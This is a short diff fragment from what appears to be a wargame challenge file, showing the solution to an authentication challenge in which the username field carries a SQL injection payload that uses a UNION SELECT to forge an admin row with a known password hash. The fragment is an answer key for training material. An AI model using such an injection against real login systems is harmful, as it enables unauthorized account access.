@@ -94,4 +94,5 @@ function auth2_onLogin(WC_Challenge $chall, $username, $password)
 ## Solution
 
 username: ' union select 1,'admin' as username,'0cc175b9c0f1b6a831c399e269772661' as password from users where username='admin
+
 password: a
